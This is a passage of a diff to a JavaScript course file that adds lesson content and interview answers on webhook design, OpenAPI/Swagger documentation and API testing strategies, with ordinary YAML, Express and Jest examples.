+                                answer: "Webhook payload design: 1) Event naming: Use resource.action pattern (order.created, payment.succeeded, user.updated), clear and predictable, 2) Payload structure: Include event metadata (id, type, timestamp, api_version) plus data object with event details, 3) Versioning: Include API version field so clients know schema version, add fields (non-breaking), create new event types for major changes, 4) Consistency: Use same structure across all events, 5) Include resource ID: Allow fetching full resource if needed. Stripe example: { id: 'evt_123', type: 'payment_intent.succeeded', created: 1617123456, api_version: '2020-08-27', data: { object: {...} } }. GitHub uses simple event names (push, pull_request, issues). Best practices: Keep payloads small (include IDs, not full nested objects), include timestamp for ordering, include event ID for idempotency, include type for routing logic. Event granularity: Fine-grained (order.created, order.shipped) better than coarse (order.updated) - gives consumers control over which events to subscribe to."
+                            },
+                            {
+                                question: "What are the best practices for implementing webhook delivery infrastructure?",
+                                answer: "Webhook infrastructure best practices: 1) Queue-based delivery: Use background job queue (Bull/BullMQ with Redis), don't send webhooks synchronously during API requests (blocks response), add webhook job to queue and return immediately, 2) Worker pool: Multiple workers process queue concurrently for scalability, 3) Timeout handling: Set 10s timeout per webhook request, respond within 5s, process async in background, 4) Response codes: Treat 2xx as success (no retry), 429/503 as temporary (retry), 4xx as permanent (no retry), 5xx as server error (retry), 5) Dead letter queue: Move failed webhooks after max retries for manual review, notify webhook owner, 6) Monitoring: Track delivery success rate, response time percentiles (p50, p95, p99), retry rate, queue size, alert on high failure rate, 7) Security: Validate URLs (must be HTTPS, publicly accessible), verify signatures, rate limit endpoints, 8) Testing: Use ngrok for local development, Stripe CLI for test events, webhook.site for inspection. Architecture: API server → Redis queue → Worker pool → Customer endpoints. This provides reliability (jobs persisted), scalability (horizontal workers), non-blocking (fast API responses)."
+                            }
+                        ]
                     }
                 ]
             },
@@ -15348,165 +24086,2859 @@ validator.isEmail(email);  // Tested, safe regex</div>
                         title: 'API Documentation with OpenAPI/Swagger',
                         duration: '50 min',
                         content: `
-                            <h2>OUTLINE: OpenAPI/Swagger</h2>
+                            <h2>What is OpenAPI?</h2>
 
-                            <h3>Topics to Cover:</h3>
-                            <ul style="margin: 1rem 0; margin-left: 2rem;">
-                                <li><strong>OpenAPI Specification</strong>
-                                    - What is OpenAPI (formerly Swagger)
-                                    - YAML vs JSON format
-                                    - Spec structure (paths, components, schemas)
-                                </li>
-                                <li><strong>Documentation Elements</strong>
-                                    - Endpoint descriptions
-                                    - Request/response schemas
-                                    - Authentication methods
-                                    - Examples and use cases
-                                    - Error responses
-                                </li>
-                                <li><strong>Tools & Ecosystem</strong>
-                                    - Swagger UI (interactive docs)
-                                    - Swagger Editor
-                                    - Code generation (server stubs, client SDKs)
-                                    - API mocking
-                                </li>
-                                <li><strong>Documentation Best Practices</strong>
-                                    - Keep docs in sync with code
-                                    - Provide examples for every endpoint
-                                    - Document error cases
-                                    - Versioned documentation
-                                    - Getting started guides
-                                </li>
-                            </ul>
+                            <p><strong>OpenAPI Specification (OAS)</strong> is a standard, language-agnostic format for describing REST APIs. It was formerly known as Swagger Specification. OpenAPI allows you to describe your entire API including endpoints, request/response formats, authentication, and error handling in a machine-readable format.</p>
 
-                            <h3>Examples to Include:</h3>
-                            <ul style="margin: 1rem 0; margin-left: 2rem;">
-                                <li>Sample OpenAPI spec</li>
-                                <li>Stripe API documentation</li>
-                                <li>Twilio API docs</li>
+                            <div class="code-block">OpenAPI benefits:
+
+✅ Single source of truth for API contract
+✅ Generate interactive documentation automatically
+✅ Generate client SDKs in multiple languages
+✅ Generate server stubs/boilerplate
+✅ API testing and validation
+✅ API mocking for development
+✅ Contract-first development
+
+Think of it as: A blueprint of your API that both humans and machines can understand</div>
+
+                            <h3>OpenAPI vs Swagger</h3>
+
+                            <div class="code-block">History:
+
+2011: Swagger created by Tony Tam
+2015: Swagger donated to OpenAPI Initiative (Linux Foundation)
+2016: Renamed to OpenAPI Specification (OAS)
+Current: OpenAPI 3.1.0 (latest), Swagger = tools that support OpenAPI
+
+Terminology:
+- OpenAPI = Specification format
+- Swagger = Tools (Swagger UI, Swagger Editor, Swagger Codegen)
+
+Example:
+"Our API uses OpenAPI 3.0 specification"
+"Our docs are built with Swagger UI"</div>
+
+                            <h2>OpenAPI Specification Structure</h2>
+
+                            <h3>Basic Structure</h3>
+
+                            <div class="code-block">OpenAPI document structure (YAML format)
+
+openapi: 3.0.0                    # OpenAPI version
+info:                              # API metadata
+  title: User API
+  version: 1.0.0
+  description: User management API
+  contact:
+    email: api@example.com
+
+servers:                           # API servers
+  - url: https://api.example.com/v1
+    description: Production
+  - url: https://staging.example.com/v1
+    description: Staging
+
+paths:                             # API endpoints
+  /users:
+    get:                           # HTTP method
+      summary: List users
+      responses:
+        '200':
+          description: Success
+
+components:                        # Reusable components
+  schemas:                         # Data models
+    User:
+      type: object
+      properties:
+        id:
+          type: integer
+        name:
+          type: string
+  securitySchemes:                 # Auth methods
+    bearerAuth:
+      type: http
+      scheme: bearer</div>
+
+                            <h3>YAML vs JSON Format</h3>
+
+                            <div class="code-block">OpenAPI can be written in YAML or JSON
+
+YAML (more readable, common choice):
+openapi: 3.0.0
+info:
+  title: User API
+  version: 1.0.0
+paths:
+  /users:
+    get:
+      summary: List users
+
+JSON (same content):
+{
+  "openapi": "3.0.0",
+  "info": {
+    "title": "User API",
+    "version": "1.0.0"
+  },
+  "paths": {
+    "/users": {
+      "get": {
+        "summary": "List users"
+      }
+    }
+  }
+}
+
+Recommendation: Use YAML (easier to read/write)</div>
+
+                            <h2>Documenting Endpoints</h2>
+
+                            <h3>Complete Endpoint Example</h3>
+
+                            <div class="code-block">Full endpoint documentation
+
+paths:
+  /users/{userId}:
+    get:
+      summary: Get user by ID
+      description: Retrieves detailed information about a specific user
+      tags:
+        - Users
+      parameters:
+        - name: userId
+          in: path
+          required: true
+          description: Unique user identifier
+          schema:
+            type: integer
+            example: 123
+        - name: include
+          in: query
+          required: false
+          description: Include related resources (orders, profile)
+          schema:
+            type: string
+            enum: [orders, profile]
+      responses:
+        '200':
+          description: User found
+          content:
+            application/json:
+              schema:
+                $ref: '#/components/schemas/User'
+              examples:
+                basic:
+                  value:
+                    id: 123
+                    name: "Alice Johnson"
+                    email: "alice@example.com"
+        '404':
+          description: User not found
+          content:
+            application/json:
+              schema:
+                $ref: '#/components/schemas/Error'
+              example:
+                code: "USER_NOT_FOUND"
+                message: "No user exists with ID 123"
+        '401':
+          description: Unauthorized - invalid or missing token
+      security:
+        - bearerAuth: []</div>
+
+                            <h3>Request Body Documentation</h3>
+
+                            <div class="code-block">POST endpoint with request body
+
+paths:
+  /users:
+    post:
+      summary: Create new user
+      requestBody:
+        required: true
+        description: User information
+        content:
+          application/json:
+            schema:
+              type: object
+              required:
+                - name
+                - email
+              properties:
+                name:
+                  type: string
+                  minLength: 2
+                  maxLength: 100
+                  example: "Alice Johnson"
+                email:
+                  type: string
+                  format: email
+                  example: "alice@example.com"
+                age:
+                  type: integer
+                  minimum: 18
+                  maximum: 120
+                  example: 25
+            examples:
+              basic:
+                value:
+                  name: "Alice Johnson"
+                  email: "alice@example.com"
+                  age: 25
+              minimal:
+                value:
+                  name: "Bob"
+                  email: "bob@example.com"
+      responses:
+        '201':
+          description: User created
+          headers:
+            Location:
+              description: URL of created user
+              schema:
+                type: string
+                example: "/users/123"
+          content:
+            application/json:
+              schema:
+                $ref: '#/components/schemas/User'
+        '400':
+          description: Invalid input
+          content:
+            application/json:
+              schema:
+                $ref: '#/components/schemas/ValidationError'</div>
+
+                            <h2>Reusable Components</h2>
+
+                            <h3>Schemas (Data Models)</h3>
+
+                            <div class="code-block">Define reusable schemas
+
+components:
+  schemas:
+    User:
+      type: object
+      required:
+        - id
+        - name
+        - email
+      properties:
+        id:
+          type: integer
+          format: int64
+          example: 123
+        name:
+          type: string
+          example: "Alice Johnson"
+        email:
+          type: string
+          format: email
+          example: "alice@example.com"
+        createdAt:
+          type: string
+          format: date-time
+          example: "2024-01-15T10:30:00Z"
+
+    Error:
+      type: object
+      properties:
+        code:
+          type: string
+          example: "VALIDATION_ERROR"
+        message:
+          type: string
+          example: "Invalid email format"
+        request_id:
+          type: string
+          example: "req_abc123"
+
+    PaginatedUsers:
+      type: object
+      properties:
+        data:
+          type: array
+          items:
+            $ref: '#/components/schemas/User'
+        pagination:
+          type: object
+          properties:
+            total:
+              type: integer
+            page:
+              type: integer
+            limit:
+              type: integer
+
+# Reference in endpoint:
+responses:
+  '200':
+    content:
+      application/json:
+        schema:
+          $ref: '#/components/schemas/User'</div>
+
+                            <h3>Security Schemes</h3>
+
+                            <div class="code-block">Document authentication methods
+
+components:
+  securitySchemes:
+    # API Key in header
+    apiKey:
+      type: apiKey
+      in: header
+      name: X-API-Key
+      description: API key for authentication
+
+    # Bearer token (JWT)
+    bearerAuth:
+      type: http
+      scheme: bearer
+      bearerFormat: JWT
+      description: JWT token authentication
+
+    # OAuth 2.0
+    oauth2:
+      type: oauth2
+      flows:
+        authorizationCode:
+          authorizationUrl: https://example.com/oauth/authorize
+          tokenUrl: https://example.com/oauth/token
+          scopes:
+            read:users: Read user information
+            write:users: Modify user information
+            delete:users: Delete users
+
+    # Basic Auth
+    basicAuth:
+      type: http
+      scheme: basic
+
+# Apply to endpoints:
+paths:
+  /users:
+    get:
+      security:
+        - bearerAuth: []        # Requires bearer token
+  /admin/users:
+    delete:
+      security:
+        - oauth2: [delete:users]  # Requires OAuth with scope</div>
+
+                            <h2>OpenAPI Tools</h2>
+
+                            <h3>Swagger UI - Interactive Documentation</h3>
+
+                            <div class="code-block">Swagger UI: Auto-generated interactive docs
+
+Features:
+✅ Browse all endpoints
+✅ See request/response schemas
+✅ Try endpoints directly ("Try it out")
+✅ See examples
+✅ Test authentication
+
+Setup (Node.js/Express):
+const swaggerUi = require('swagger-ui-express');
+const YAML = require('yamljs');
+const openApiSpec = YAML.load('./openapi.yaml');
+
+app.use('/api-docs', swaggerUi.serve, swaggerUi.setup(openApiSpec));
+
+// Visit: http://localhost:3000/api-docs
+
+Users can:
+1. Select endpoint (GET /users/{userId})
+2. Click "Try it out"
+3. Enter userId: 123
+4. Click "Execute"
+5. See actual response from your API
+
+Live examples:
+- https://petstore.swagger.io (demo)
+- Stripe API docs (uses similar interactive format)
+- Twilio API docs</div>
+
+                            <h3>Swagger Editor</h3>
+
+                            <div class="code-block">Swagger Editor: Write OpenAPI specs with validation
+
+Features:
+✅ Live preview of docs
+✅ Syntax validation
+✅ Auto-complete
+✅ Error highlighting
+✅ Examples and templates
+
+Online: https://editor.swagger.io
+Offline: npm install -g swagger-editor
+
+Workflow:
+1. Write OpenAPI spec in left pane (YAML)
+2. See live preview in right pane
+3. Instant validation errors
+4. Export spec, generate code</div>
+
+                            <h3>Code Generation</h3>
+
+                            <div class="code-block">Generate code from OpenAPI spec
+
+Swagger Codegen / OpenAPI Generator
+
+Generate server stubs:
+$ openapi-generator-cli generate \\
+  -i openapi.yaml \\
+  -g nodejs-express-server \\
+  -o ./server
+
+Generates:
+- Express route handlers
+- Request validation
+- Response serialization
+- API documentation
+
+Generate client SDKs:
+$ openapi-generator-cli generate \\
+  -i openapi.yaml \\
+  -g javascript \\
+  -o ./client-sdk
+
+Generates client library:
+const api = require('./client-sdk');
+const user = await api.getUser(123);
+
+Supported languages:
+- JavaScript, TypeScript, Python, Java, Go, Ruby, PHP, C#, Swift, Kotlin
+- 50+ languages/frameworks
+
+Benefits:
+✅ Type-safe clients
+✅ Consistent error handling
+✅ Automatic retries
+✅ Built-in validation</div>
+
+                            <h3>API Mocking</h3>
+
+                            <div class="code-block">Mock APIs from OpenAPI spec
+
+Use cases:
+- Frontend development before backend ready
+- Testing without hitting real API
+- Demos and prototypes
+
+Tools:
+
+1. Prism (by Stoplight)
+$ prism mock openapi.yaml
+
+→ Starts mock server on http://localhost:4010
+→ Returns example responses from OpenAPI spec
+→ Validates requests against schema
+
+2. Mockoon
+GUI tool to create mock APIs from OpenAPI
+
+3. Postman Mock Servers
+Import OpenAPI spec → Create mock server
+→ Get mock URL: https://abc123.mock.pstmn.io
+
+Example workflow:
+1. Define API in OpenAPI spec with examples
+2. Start Prism mock server
+3. Frontend team develops against mock API
+4. Backend team implements actual API
+5. Switch frontend to real API (same contract!)</div>
+
+                            <h2>Documentation Best Practices</h2>
+
+                            <h3>Keep Docs in Sync with Code</h3>
+
+                            <div class="code-block">Strategies to avoid docs drift
+
+❌ BAD: Manual documentation
+- Developer implements endpoint
+- Separately updates OpenAPI spec
+- Docs get out of sync
+
+✅ GOOD: Code-first with annotations
+// Using tsoa (TypeScript)
+@Route("users")
+export class UserController {
+  @Get("{userId}")
+  @Response<ErrorResponse>(404, "User not found")
+  public async getUser(
+    @Path() userId: number
+  ): Promise<User> {
+    // ...
+  }
+}
+→ Generates OpenAPI spec from code
+
+✅ GOOD: Spec-first with validation
+1. Write OpenAPI spec first
+2. Generate server stubs
+3. Implement handlers
+4. Validate requests/responses against spec
+
+// express-openapi-validator
+const OpenApiValidator = require('express-openapi-validator');
+
+app.use(
+  OpenApiValidator.middleware({
+    apiSpec: './openapi.yaml',
+    validateRequests: true,
+    validateResponses: true  // Fail if response doesn't match spec
+  })
+);
+
+✅ GOOD: Automated tests
+// Test that API matches OpenAPI spec
+const { matchers } = require('jest-openapi');
+const spec = require('./openapi.yaml');
+
+expect.extend(matchers(spec));
+
+test('GET /users/{id} matches spec', async () => {
+  const res = await request(app).get('/users/123');
+  expect(res).toSatisfyApiSpec();
+});</div>
+
+                            <h3>Provide Examples for Everything</h3>
+
+                            <div class="code-block">Include examples for all scenarios
+
+✅ Request examples (good and bad):
+requestBody:
+  content:
+    application/json:
+      examples:
+        valid:
+          summary: Valid user creation
+          value:
+            name: "Alice"
+            email: "alice@example.com"
+        invalid_email:
+          summary: Invalid email format
+          value:
+            name: "Alice"
+            email: "not-an-email"
+
+✅ Response examples (success and errors):
+responses:
+  '200':
+    examples:
+      user_with_orders:
+        value:
+          id: 123
+          name: "Alice"
+          orders: [...]
+      user_without_orders:
+        value:
+          id: 123
+          name: "Alice"
+  '400':
+    examples:
+      validation_error:
+        value:
+          code: "VALIDATION_ERROR"
+          errors: [{field: "email", message: "Invalid format"}]
+
+Why examples matter:
+- Developers learn by example
+- Clarify edge cases
+- Enable "Try it out" in Swagger UI
+- Useful for mocking</div>
+
+                            <h3>Document All Error Cases</h3>
+
+                            <div class="code-block">Document every possible error
+
+paths:
+  /users/{userId}:
+    delete:
+      responses:
+        '204':
+          description: User deleted successfully
+        '401':
+          description: Unauthorized - missing or invalid token
+          content:
+            application/json:
+              schema:
+                $ref: '#/components/schemas/Error'
+              example:
+                code: "AUTH_TOKEN_INVALID"
+        '403':
+          description: Forbidden - insufficient permissions
+          content:
+            application/json:
+              example:
+                code: "INSUFFICIENT_PERMISSIONS"
+                message: "Admin role required to delete users"
+        '404':
+          description: User not found
+          content:
+            application/json:
+              example:
+                code: "USER_NOT_FOUND"
+                message: "No user exists with ID 123"
+        '409':
+          description: Conflict - user has active orders
+          content:
+            application/json:
+              example:
+                code: "RESOURCE_CONFLICT"
+                message: "Cannot delete user with active orders"
+
+Don't just document happy path!
+Document all status codes your API returns.</div>
+
+                            <h3>Version Documentation</h3>
+
+                            <div class="code-block">Maintain docs for each API version
+
+Directory structure:
+docs/
+  v1/
+    openapi.yaml
+  v2/
+    openapi.yaml
+
+Swagger UI setup:
+app.use('/docs/v1', swaggerUi.serve, swaggerUi.setup(openApiV1));
+app.use('/docs/v2', swaggerUi.serve, swaggerUi.setup(openApiV2));
+
+Document breaking changes:
+info:
+  title: User API
+  version: 2.0.0
+  description: |
+    Version 2.0 changes:
+    - BREAKING: /users endpoint now requires pagination
+    - BREAKING: User.created_at renamed to User.createdAt
+    - Added: /users/batch endpoint for bulk operations
+
+    Migration guide: https://docs.example.com/v1-to-v2
+
+Keep old versions available:
+- v1 deprecated but still accessible
+- Clear migration path documented
+- Sunset date announced</div>
+
+                            <h2>Real-World Examples</h2>
+
+                            <h3>Stripe API Documentation</h3>
+
+                            <div class="code-block">Stripe's documentation pattern (inspired by OpenAPI)
+
+Features:
+✅ Interactive examples (try with test API key)
+✅ Code examples in 8 languages (auto-generated)
+✅ Request/response samples
+✅ Error documentation with solutions
+✅ Versioned docs (dated versions)
+
+Example endpoint doc:
+Title: Create a customer
+Endpoint: POST /v1/customers
+Parameters:
+  - email (optional): Customer email
+  - name (optional): Customer name
+  - metadata (optional): Key-value pairs
+Returns: Customer object
+Errors:
+  - 400: Invalid parameters
+  - 401: Invalid API key
+
+Live example:
+curl https://api.stripe.com/v1/customers \\
+  -u your_test_key: \\
+  -d email="customer@example.com"
+
+Response:
+{
+  "id": "cus_abc123",
+  "email": "customer@example.com",
+  ...
+}
+
+Lessons from Stripe:
+- Show examples first (code before prose)
+- Include common error scenarios
+- Provide working curl commands
+- Link to related concepts</div>
+
+                            <h3>Twilio API Documentation</h3>
+
+                            <div class="code-block">Twilio's documentation approach
+
+Features:
+✅ Getting started guides
+✅ Interactive API Explorer
+✅ Auto-generated client libraries
+✅ Code snippets in multiple languages
+✅ Webhooks documentation
+✅ Testing with test credentials
+
+Example:
+Send SMS endpoint
+POST /2010-04-01/Accounts/{AccountSid}/Messages.json
+
+Parameters:
+  From: Your Twilio phone number
+  To: Recipient phone number
+  Body: Message text
+
+Try it:
+const client = require('twilio')(accountSid, authToken);
+client.messages.create({
+  from: '+15551234567',
+  to: '+15559876543',
+  body: 'Hello from Twilio!'
+});
+
+Lessons from Twilio:
+- Quickstart guides for common use cases
+- Authentication clearly explained
+- Webhook documentation
+- Test credentials for experimentation</div>
+
+                            <h2>Common Mistakes</h2>
+
+                            <div class="code-block">1. Outdated documentation
+❌ API changes, docs don't
+✅ Automate: generate from code or validate against spec
+
+2. Missing examples
+❌ Only schemas, no examples
+✅ Provide request/response examples for every endpoint
+
+3. Incomplete error documentation
+❌ Only document 200 success
+✅ Document all possible status codes (401, 403, 404, etc.)
+
+4. No authentication docs
+❌ "Use a token" (how? where?)
+✅ Show exact header format, token retrieval process
+
+5. Generic descriptions
+❌ "Get user" (no details)
+✅ "Retrieves user profile including name, email, creation date"
+
+6. No versioning
+❌ Breaking changes without versioned docs
+✅ Maintain docs for each API version
+
+7. Not using \$ref
+❌ Copy/paste same schema everywhere
+✅ Define schemas in components, reference with \$ref
+
+8. Ignoring deprecation
+❌ Remove endpoint without warning
+✅ Mark as deprecated in OpenAPI, provide migration guide</div>
+
+                            <h2>Summary</h2>
+
+                            <ul>
+                                <li><strong>OpenAPI Specification</strong> is a standard format for describing REST APIs in YAML or JSON</li>
+                                <li><strong>Structure:</strong> info (metadata), servers (URLs), paths (endpoints), components (reusable schemas)</li>
+                                <li><strong>Swagger UI:</strong> Auto-generates interactive documentation from OpenAPI spec</li>
+                                <li><strong>Swagger Editor:</strong> Write and validate OpenAPI specs with live preview</li>
+                                <li><strong>Code generation:</strong> Generate server stubs and client SDKs in 50+ languages</li>
+                                <li><strong>API mocking:</strong> Use Prism or Mockoon to create mock APIs from spec</li>
+                                <li><strong>Keep in sync:</strong> Use code annotations, spec validation, or automated tests to prevent docs drift</li>
+                                <li><strong>Examples everywhere:</strong> Include request/response examples for all scenarios</li>
+                                <li><strong>Document errors:</strong> Include all status codes (401, 403, 404, etc.) with examples</li>
+                                <li><strong>Version docs:</strong> Maintain separate docs for each API version with migration guides</li>
+                                <li><strong>Security schemes:</strong> Document authentication methods (API keys, Bearer, OAuth)</li>
+                                <li><strong>Best practices:</strong> Stripe and Twilio provide excellent documentation examples</li>
                             </ul>
                         `,
-                        interviews: []
+                        interviews: [
+                            {
+                                question: "What is OpenAPI Specification and how does it differ from Swagger?",
+                                answer: "OpenAPI Specification (OAS) is a standard, language-agnostic format for describing REST APIs using YAML or JSON. It was created as Swagger in 2011, then donated to OpenAPI Initiative in 2015 and renamed. Current version: OpenAPI 3.1.0. Difference: OpenAPI = the specification format itself, Swagger = tools that support OpenAPI (Swagger UI for docs, Swagger Editor for writing specs, Swagger Codegen for generating code). Analogy: OpenAPI is the standard (like HTML), Swagger is the toolset (like Chrome browser). Benefits: 1) Single source of truth for API contract, 2) Generate interactive documentation automatically, 3) Generate client SDKs in 50+ languages, 4) Generate server stubs, 5) API testing and validation, 6) API mocking for development. Structure: info (metadata), servers (API URLs), paths (endpoints with methods/parameters/responses), components (reusable schemas, security schemes). Use: Define API contract, generate docs with Swagger UI, validate requests/responses, generate client libraries."
+                            },
+                            {
+                                question: "How do you keep API documentation in sync with code?",
+                                answer: "Three strategies to prevent docs drift: 1) Code-first with annotations: Use libraries like tsoa (TypeScript), NestJS decorators, or FastAPI (Python) that generate OpenAPI from code annotations: @Get('{userId}') getUser(@Path() userId: number): Promise<User> - OpenAPI spec auto-generated from types and decorators. 2) Spec-first with validation: Write OpenAPI spec first, then validate code against it using express-openapi-validator: validateRequests: true, validateResponses: true - API throws error if response doesn't match spec, forces docs to stay accurate. 3) Automated testing: Test that actual API matches OpenAPI spec: expect(res).toSatisfyApiSpec() using jest-openapi matchers - CI fails if API diverges from spec. Best approach: Spec-first for new APIs (design contract first), code-first for existing APIs (less refactoring). Avoid: Manual documentation separate from code (guaranteed to drift). Workflow: Update spec → validate against spec → deploy. Or: Update code annotations → regenerate spec → deploy. Both ensure docs are always accurate."
+                            },
+                            {
+                                question: "What are the key components of a well-documented OpenAPI endpoint?",
+                                answer: "Complete endpoint documentation includes: 1) Summary & description: Brief summary (shows in sidebar), detailed description (explains what it does), 2) Parameters: Path params (userId in /users/{userId}), query params (?include=orders), headers (X-Request-ID), with type, required flag, description, examples, 3) Request body: Schema (data structure), required fields, validation rules (minLength, format), examples (multiple scenarios), 4) Responses: All status codes (200, 400, 401, 403, 404, 500), response schemas, examples for each, headers (Location, X-Rate-Limit), 5) Security: Which auth required (bearerAuth, apiKey, oauth2 with scopes), 6) Tags: Group related endpoints (Users, Orders), 7) Examples: Request examples (valid and invalid), response examples (success and errors), curl commands. Example: GET /users/{userId} needs: path param userId (integer, example: 123), responses 200 (User schema), 404 (Error schema with example), 401 (auth error), security (bearerAuth), tag (Users). Don't just document happy path - include all error cases with specific error codes and messages. Provide working examples users can copy/paste."
+                            },
+                            {
+                                question: "How do you use OpenAPI for API mocking and why is it useful?",
+                                answer: "API mocking from OpenAPI spec allows frontend development before backend ready. Tools: 1) Prism by Stoplight: prism mock openapi.yaml → starts server on :4010 → returns example responses from spec → validates requests against schema, 2) Mockoon: GUI tool to import OpenAPI spec and create mock server, 3) Postman: Import OpenAPI → Create mock server → get URL like abc123.mock.pstmn.io. Workflow: 1) Define API contract in OpenAPI with examples, 2) Frontend team develops against mock server, 3) Backend team implements actual API (following same spec), 4) Switch frontend to real API - same contract, seamless transition. Benefits: 1) Parallel development (frontend doesn't wait for backend), 2) Contract agreement (both teams align on API shape), 3) Early testing (test frontend logic without backend), 4) Demos (show working prototype before implementation). Key: Examples in OpenAPI spec become mock responses. Example: response 200: example: { id: 123, name: 'Alice' } → Prism returns this when GET /users/123 called. Also validates: Prism returns 400 if request doesn't match schema (missing required field). Mocking enables contract-first development and faster iteration."
+                            },
+                            {
+                                question: "What are reusable components in OpenAPI and why use them?",
+                                answer: "Reusable components (components section) define schemas, responses, parameters, examples, security schemes that can be referenced multiple times using $ref. Types: 1) Schemas: Data models like User, Order, Error - define once, reference everywhere, 2) Security schemes: Auth methods like bearerAuth, apiKey, oauth2, 3) Responses: Common responses like 401 Unauthorized, 404 Not Found, 4) Parameters: Common params like pagination (page, limit), 5) Examples: Reusable request/response examples. Define: components: { schemas: { User: { type: object, properties: {...} } } }. Reference: schema: { $ref: '#/components/schemas/User' }. Benefits: 1) DRY (don't repeat yourself): Define User once, use in GET /users, POST /users, PATCH /users, 2) Consistency: All endpoints return same User shape, 3) Maintenance: Change User schema once, all endpoints updated, 4) Smaller spec: Reference instead of copy/paste. Example: Error schema defined once with code, message, request_id, then all error responses reference it: 404: { schema: { $ref: '#/components/schemas/Error' } }. Security schemes: Define bearerAuth once, then endpoints just specify security: [bearerAuth: []]. This makes spec more maintainable and prevents inconsistencies across endpoints."
+                            },
+                            {
+                                question: "How do you document API versioning in OpenAPI?",
+                                answer: "API versioning in OpenAPI: 1) Separate spec files: docs/v1/openapi.yaml, docs/v2/openapi.yaml - maintain complete spec for each version, 2) Different servers: servers: [{ url: 'https://api.example.com/v1' }, { url: 'https://api.example.com/v2' }], 3) Version in info: info: { version: '2.0.0', description: 'Breaking changes: ...' }, 4) Document changes: Include migration guide in description, list breaking changes, sunset dates for old versions. Swagger UI setup: app.use('/docs/v1', swaggerUi.setup(openApiV1)); app.use('/docs/v2', swaggerUi.setup(openApiV2)) - users can access docs for each version. Deprecation: Mark deprecated endpoints: deprecated: true, provide alternative: description: 'DEPRECATED: Use POST /v2/users instead. This endpoint will be removed on 2025-01-01'. Changes documentation: info: { description: 'Version 2.0 changes: BREAKING: pagination now required, BREAKING: created_at → createdAt, Added: batch endpoints, Migration: https://docs.example.com/v1-to-v2' }. Best practices: 1) Keep old version docs accessible, 2) Clear migration guide with examples, 3) Announce sunset date in advance, 4) Don't break v1 when releasing v2. Version in URL (v1, v2) or header, but always maintain separate OpenAPI specs so developers know exact differences."
+                            }
+                        ]
                     },
                     {
                         id: 'api-testing',
                         title: 'API Testing Strategies',
                         duration: '50 min',
                         content: `
-                            <h2>OUTLINE: API Testing</h2>
+                            <h2>The Testing Pyramid</h2>
 
-                            <h3>Topics to Cover:</h3>
-                            <ul style="margin: 1rem 0; margin-left: 2rem;">
-                                <li><strong>Testing Pyramid</strong>
-                                    - Unit tests (business logic)
-                                    - Integration tests (API endpoints)
-                                    - Contract tests (API contracts)
-                                    - End-to-end tests (full workflows)
-                                </li>
-                                <li><strong>Test Types</strong>
-                                    - Functional testing (does it work?)
-                                    - Security testing (vulnerabilities)
-                                    - Performance testing (load, stress)
-                                    - Contract testing (Pact, consumer-driven)
-                                </li>
-                                <li><strong>Testing Tools</strong>
-                                    - Jest, Mocha (JavaScript)
-                                    - Postman/Newman (automated tests)
-                                    - REST Assured (Java)
-                                    - pytest (Python)
-                                    - K6, JMeter (performance)
-                                </li>
-                                <li><strong>Best Practices</strong>
-                                    - Test data management
-                                    - Mocking external services
-                                    - CI/CD integration
-                                    - Test coverage metrics
-                                </li>
+                            <p>The testing pyramid is a strategy for balancing different types of tests. The idea: many fast unit tests at the bottom, fewer slow end-to-end tests at the top.</p>
+
+                            <div class="code-block">Testing Pyramid for APIs
+
+                 /\\
+                /  \\    E2E Tests (few, slow, expensive)
+               /____\\   - Full user workflows
+              /      \\  - Real external services
+             /        \\ - Browser + API + DB
+            /__________\\
+
+           /            \\ Contract Tests (some)
+          /              \\ - API contracts
+         /                \\ - Consumer-driven contracts
+        /                  \\ - Mock services
+       /____________________\\
+
+      /                      \\ Integration Tests (more)
+     /                        \\ - API endpoint tests
+    /                          \\ - Database included
+   /                            \\ - Real HTTP requests
+  /______________________________\\
+
+ /                                \\ Unit Tests (many, fast, cheap)
+/                                  \\ - Business logic
+                                    \\ - No external dependencies
+                                    \\ - Mock everything
+
+Ratio: 70% unit, 20% integration, 10% E2E (rough guideline)</div>
+
+                            <h3>Unit Tests - Business Logic</h3>
+
+                            <div class="code-block">Test business logic in isolation
+
+Example: Validate email function
+// email-validator.js
+function isValidEmail(email) {
+  const regex = /^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$/;
+  return regex.test(email);
+}
+
+// email-validator.test.js
+const { isValidEmail } = require('./email-validator');
+
+describe('isValidEmail', () => {
+  test('accepts valid emails', () => {
+    expect(isValidEmail('user@example.com')).toBe(true);
+    expect(isValidEmail('alice+tag@domain.co.uk')).toBe(true);
+  });
+
+  test('rejects invalid emails', () => {
+    expect(isValidEmail('not-an-email')).toBe(false);
+    expect(isValidEmail('@example.com')).toBe(false);
+    expect(isValidEmail('user@')).toBe(false);
+  });
+});
+
+Characteristics:
+✅ Fast (runs in milliseconds)
+✅ No external dependencies (no DB, no HTTP)
+✅ Easy to debug (single function)
+✅ Run frequently (on every save)
+
+Benefits: Catch bugs early, fast feedback</div>
+
+                            <h3>Integration Tests - API Endpoints</h3>
+
+                            <div class="code-block">Test API endpoints with real HTTP requests
+
+// users.test.js (using Supertest + Jest)
+const request = require('supertest');
+const app = require('./app');
+const db = require('./db');
+
+beforeEach(async () => {
+  await db.migrate.latest();  // Fresh database
+  await db.seed.run();        // Seed test data
+});
+
+afterEach(async () => {
+  await db.migrate.rollback(); // Clean up
+});
+
+describe('GET /api/users/:id', () => {
+  test('returns user when exists', async () => {
+    const res = await request(app)
+      .get('/api/users/1')
+      .set('Authorization', 'Bearer test-token');
+
+    expect(res.status).toBe(200);
+    expect(res.body).toMatchObject({
+      id: 1,
+      name: 'Alice Johnson',
+      email: 'alice@example.com'
+    });
+  });
+
+  test('returns 404 when user not found', async () => {
+    const res = await request(app).get('/api/users/999');
+
+    expect(res.status).toBe(404);
+    expect(res.body.code).toBe('USER_NOT_FOUND');
+  });
+
+  test('returns 401 when no token', async () => {
+    const res = await request(app).get('/api/users/1');
+
+    expect(res.status).toBe(401);
+  });
+});
+
+Characteristics:
+- Real HTTP requests (GET, POST, etc.)
+- Real database (test database)
+- No mocking (or minimal)
+- Slower than unit tests (database overhead)
+
+Benefits: Test actual API behavior, catch integration bugs</div>
+
+                            <h3>Contract Tests</h3>
+
+                            <div class="code-block">Test API contracts between services
+
+Problem: Microservices with dependencies
+User Service → Order Service → Payment Service
+If Order Service changes response format, User Service breaks
+
+Solution: Contract testing (Pact)
+
+Consumer (User Service) defines contract:
+const { Pact } = require('@pact-foundation/pact');
+
+const provider = new Pact({
+  consumer: 'UserService',
+  provider: 'OrderService'
+});
+
+describe('Order Service contract', () => {
+  test('get user orders', async () => {
+    await provider.addInteraction({
+      state: 'user 123 has orders',
